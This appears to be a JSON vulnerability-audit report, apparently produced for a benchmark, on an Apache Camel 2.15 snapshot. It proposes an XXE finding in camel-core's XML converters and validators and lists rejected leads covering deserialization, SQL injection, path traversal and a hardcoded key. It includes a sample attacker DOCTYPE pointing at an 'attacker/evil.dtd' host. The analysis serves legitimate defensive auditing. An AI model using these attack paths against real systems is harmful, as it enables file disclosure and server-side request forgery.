@@ -1,0 +1,74 @@
+{
+  "candidates": [
+    {
+      "attacker_control": "The XML payload is the Camel message body (or a header converted to XML) supplied by a remote client of any inbound transport (HTTP/Jetty/Servlet/Netty/HTTP, JMS, file, etc.). The Content-Type is not relevant; only well-formed XML with a DOCTYPE/entity declaration is needed.",
+      "confidence": "medium",
+      "counterevidence_checked": "XmlConverter does disable external-general-entities on the DocumentBuilderFactory (lines 1104-1110), so the simplest <!ENTITY xxe SYSTEM \"file:///...\">-then-&xxe; read is blocked on the DOM path; the remaining DBF exposure is parameter-entity/external-DTD based (blind) and not a trivial in-band read. StaxConverter.createXMLInputFactory (StaxConverter.java:319-341) already sets SUPPORT_DTD=false, IS_SUPPORTING_EXTERNAL_ENTITIES=false and a throwing XMLResolver, so StAX-based conversions (camel-jaxb, XSLT when allowStAX=true, non-default) are hardened. XsltBuilder/XPathBuilder are the main, but not the only, callers. On the SAX path, JDK 7u40+/8 FEATURE_SECURE_PROCESSING defaults accessExternalDTD/accessExternalStylesheet to \"\" for the built-in Xerces, so that specific path may be mitigated on modern JDKs even though the explicit entity features are absent (JDK 6/early 7 and alternative JAXP parsers are not). Also checked and did not select the HTTP Java-deserialization pattern (see rejected leads).",
+      "id": "camel-core-xml-xxe",
+      "impact": "XML External Entity processing for attacker-controlled XML: disclosure of files readable by the Camel process (directly when parsed output is re-emitted, or out-of-band via parameter entities), server-side request forgery/port scanning from the Camel host (external DTD/entity fetches), and denial of service through entity expansion. On the validator path with useDom/msv the parsed DOM can include the expanded entity content and be propagated as the message body.",
+      "locations": [
+        {
+          "end_line": 1126,
+          "path": "camel-core/src/main/java/org/apache/camel/converter/jaxp/XmlConverter.java",
+          "start_line": 1099
+        },
+        {
+          "end_line": 607,
+          "path": "camel-core/src/main/java/org/apache/camel/converter/jaxp/XmlConverter.java",
+          "start_line": 575
+        },
+        {
+          "end_line": 337,
+          "path": "camel-core/src/main/java/org/apache/camel/processor/validation/ValidatingProcessor.java",
+          "start_line": 331
+        },
+        {
+          "end_line": 461,
+          "path": "camel-core/src/main/java/org/apache/camel/processor/validation/ValidatingProcessor.java",
+          "start_line": 417
+        }
+      ],
+      "prerequisites": "A route that parses untrusted XML through Camel's conversion machinery: xpath(...) / to(\"xslt:...\") / to(\"validator:...\") / to(\"msv:...\") or any conversion to Document/DOMSource/SAXSource/String. For the DBF/validator paths default JDK behavior suffices (no secure processing is set, so external access is unrestricted); the SAX-reader path additionally depends on the JAXP implementation (on JDK 6/early 7 or non-Xerces parsers secure processing does not block external fetches). No credentials or special configuration are required.",
+      "root_cause": "Camel-core's shared XML parsing helpers create JAXP factories/validators with only partial XXE hardening. (1) XmlConverter.createDocumentBuilderFactory() disables only http://xml.org/sax/features/external-general-entities; external-parameter-entities and external DTD loading stay enabled and FEATURE_SECURE_PROCESSING is not set, so a crafted DOCTYPE with parameter entities/external DTD can still make the parser fetch attacker- or file-specified resources (blind file exfiltration/SSRF). (2) XmlConverter.toSAXSourceFromStream(), which builds the XMLReader used by every StreamSource/InputStream/String -> SAXSource conversion, sets only FEATURE_SECURE_PROCESSING and no external-general-entities/external-parameter-entities/DTD restriction; on JAXP implementations/JDKs where secure processing does not restrict external access this resolves external general entities (classic file-read XXE). (3) ValidatingProcessor.createSchemaFactory() creates a SchemaFactory without FEATURE_SECURE_PROCESSING/access restrictions and getSource() hands the raw message body to Validator.validate() as a StreamSource, so the JAXP validator parses attacker XML with default external access.",
+      "title": "XXE via camel-core XML converters/validators: external entity and DTD resolution not fully disabled for untrusted XML bodies",
+      "trace": "XSLT: XsltBuilder.getSource() (camel-core/.../builder/xml/XsltBuilder.java:503-555) tries tryConvertTo(SAXSource.class, ...) at line 524 for a String/InputStream/byte[] body -> XmlConverter.toSAXSource(InputStream,Exchange) (XmlConverter.java:397-399) -> toSAXSource(Source,Exchange) (460-472) -> toSAXSourceFromStream() (575-607) which creates the SAXParserFactory with only FEATURE_SECURE_PROCESSING. DOM/XPath: XPathBuilder.doGetDocument() (XPathBuilder.java:1095-1127) converts the body to Document via the type converter -> XmlConverter.toDOMDocument(InputStream/InputSource/String/File,...) (XmlConverter.java:820-946) -> getDocumentBuilderFactory()/createDocumentBuilderFactory() (1032-1126), which leaves external-parameter-entities and external DTDs enabled. Validator: ValidatingProcessor.doProcess() (ValidatingProcessor.java:94-162) -> getSource() (417-461, raw StreamSource for InputStream bodies) -> schema.newValidator().validate(source,result) (line 150) using a SchemaFactory created without secure processing (331-337). A DOCTYPE such as <!DOCTYPE foo SYSTEM \"http://attacker/evil.dtd\"> plus parameter-entity definitions causes outbound DTD/entity fetches (http://, file://), and where the parsed node/result is further used (e.g., XSLT copy-of, DOMResult/useDom) file content can be returned in processed output.",
+      "unverified": "Not executed or reproduced; no build/tests are present in the snapshot, and I could not inspect git history or the fixing patch. It is unconfirmed that this is the snapshot's intended vulnerability: the exact fix commit/CVE and whether the reproducer exercises the DBF/SAX/validator path is not verifiable from source alone. JDK/JAXP implementation behavior determines exploitability of the SAX path, and direct file disclosure requires the parsed result (or an out-of-band exfiltration channel) to be observed by the attacker.",
+      "weakness_type": "CWE-611 Improper Restriction of XML External Entity Reference"
+    }
+  ],
+  "coverage_summary": "Reviewed the whole assigned tree at a survey level: camel-core main converters/languages/processors (XmlConverter, StaxConverter, XPathBuilder, XsltBuilder, ValidatingProcessor, HTTP/Jetty/Netty/MINA bindings, file component), the parent POM and component inventory, and spot-audited high-risk components (http/http4, jetty-common, netty-http(s), ahc, ftp/sftp, file, jdbc/sql, pgevent, ldap, shiro, xmlsecurity, xstream/serialization, stax, jing, msv, schematron, tagsoup, castor, jaxb, docker). Tests are absent from the snapshot (only test-support main classes remain), so no test-based validation was possible. Search covered command execution, JNDI, ObjectInputStream/readObject, XML parser factories (DocumentBuilderFactory/SAXParserFactory/XMLInputFactory/TransformerFactory/SchemaFactory), SQL execution, URL/SSRF sinks and file/path handling.",
+  "limitations": [
+    "No git history, fix commit, or patch metadata is visible, so the intended vulnerability cannot be confirmed; the snapshot is Apache Camel 2.15-SNAPSHOT with dependency versions indicating ~Feb-Mar 2015, which guided (but did not prove) the selection of the XXE finding.",
+    "No tests are present in the snapshot and no build/execution was performed; all conclusions are static source reasoning, not runtime-confirmed exploitability.",
+    "Exploitability of JAXP secure-processing behavior varies by JDK/JAXP implementation (JDK 6/early 7 vs 7u40+/8, Xerces vs other parsers); the DocumentBuilderFactory and validator paths do not set secure processing, but the SAX path's practical exposure depends on the runtime.",
+    "Only camel-core XML paths plus selected components were examined in depth; the remaining ~200 components were surveyed, not exhaustively line-reviewed.",
+    "Only one candidate could be submitted, so other plausible but weaker/unconfirmed issues (HTTP Java deserialization, pgevent SQL concatenation, component XML parsers) are listed only as rejected leads."
+  ],
+  "rejected_leads": [
+    {
+      "lead": "Unconditional Java deserialization of HTTP payloads (CWE-502): camel-http/http4 DefaultHttpBinding.readMessage (HttpConstants.CONTENT_TYPE_JAVA_SERIALIZED_OBJECT -> HttpHelper.deserializeJavaObjectFromStream -> ObjectInputStream.readObject), HttpProducer.extractResponseBody, DefaultAhcBinding, DefaultJettyHttpBinding, NettyHttpHelper, HttpHelper.java:122-136.",
+      "reason": "Real and severe (remote deserialization of attacker-supplied streams), and later Camel versions gate exactly this with allowJavaSerializedObject=false, but in this 2.15-SNAPSHOT tree it looks like intentional Camel-to-Camel interop; the corresponding hardening (2.15.5/2.16.1 era) is much later than this snapshot's dependency/date profile (~Feb-Mar 2015), so it is likely not this case's ground-truth. Mentioned as an unconfirmed, separate lead, not selected."
+    },
+    {
+      "lead": "SQL injection in camel-pgevent PgEventProducer.process (PgEventProducer.java:56): \"NOTIFY \" + endpoint.getChannel() + \", '\" + exchange.getOut().getBody(String.class) + \"'\" executed via Statement.execute.",
+      "reason": "Clear string-concatenation SQL sink, but it reads the OUT body, which is typically an empty lazily-created message unless the route explicitly sets it; reachability by an attacker-controlled body is therefore route-dependent and uncertain."
+    },
+    {
+      "lead": "Component-level XML parsers without external-entity hardening: camel-schematron SchematronProcessorFactory.getXMLReader (69-75, raw SAXParserFactory), camel-jing JingValidator.process (52-79, Jaxp11XMLReaderCreator), camel-stax StAXJAXBIteratorExpression.evaluate (113-125, raw XMLInputFactory when isNamespaceAware=false).",
+      "reason": "Plausible XXE sinks of the same class, but each is component-specific and I could not verify which (if any) was addressed by the snapshot's fixing commit; left as unconfirmed rather than added to the single candidate."
+    },
+    {
+      "lead": "Path traversal via the CamelFileName header in GenericFileProducer.createFileName (284-359): attacker-influenced name is concatenated onto the endpoint directory for file/ftp producers.",
+      "reason": "No normalization/stripping of .. in this path, but file/ftp subdirectory naming via CamelFileName is documented behavior and I could not confirm an intended validation boundary or that it was ever fixed as a vulnerability."
+    },
+    {
+      "lead": "Hardcoded default AES key in camel-shiro: ShiroSecurityPolicy passes a static bits128 key when no passphrase is configured (ShiroSecurityPolicy.java:33-61) and ShiroSecurityProcessor decrypts and ObjectInputStream-deserializes the token (117-126).",
+      "reason": "Known-looking weakness (predictable key can allow token forgery / deserialization), but it requires the default-passphrase configuration and has no confirmed fix mapping in this window."
+    },
+    {
+      "lead": "By-design injection surfaces: camel-sql/jdbc accepting SQL in the message body, camel-ldap using the body as LDAP filter, camel-script/groovy/mvel/ognl evaluating configured expressions.",
+      "reason": "Documented behavior, not a vulnerability of this snapshot."
+    }
+  ],
+  "summary": "Scope: full Apache Camel 2.15-SNAPSHOT snapshot (6,614 readable files: camel-core, 203 components, tooling/examples/platforms; all test sources appear stripped, so no reproducer tests were available). I reviewed high-risk areas — XML/JAXP parsing and conversion, XPath/XSLT/validation, HTTP/Jetty/Netty/MINA bindings, Java deserialization, SQL/LDAP, file/FTP path handling, SSL/JSSE and security components. I traced attacker-controlled message content through Camel's type-conversion, XPath, XSLT and validator paths into camel-core's shared JAXP factories. Strongest source-evidenced candidate: incomplete XXE hardening in camel-core XML handling (CWE-611), where external DTD/parameter-entity resolution (and, on some JAXP implementations, general-entity resolution) remains enabled for untrusted XML bodies."
+}
